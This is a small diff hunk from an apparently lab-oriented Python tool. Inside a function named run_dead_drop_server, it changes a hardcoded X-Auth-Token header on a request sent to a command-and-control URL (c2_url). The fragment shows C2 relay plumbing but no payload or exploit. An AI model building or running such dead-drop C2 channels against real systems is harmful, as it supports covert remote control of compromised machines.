@@ -1104,7 +1104,7 @@ def run_dead_drop_server(host="0.0.0.0", port=5001):
                     c2_url, data=c2_body,
                     headers={
                         "Content-Type":  "application/json",
-                        "X-Auth-Token":  "LAB_RESEARCH_TOKEN_2026",
+                        "X-Auth-Token":  "aw",
                     }
                 )
                 with urllib.request.urlopen(c2_req, timeout=3):
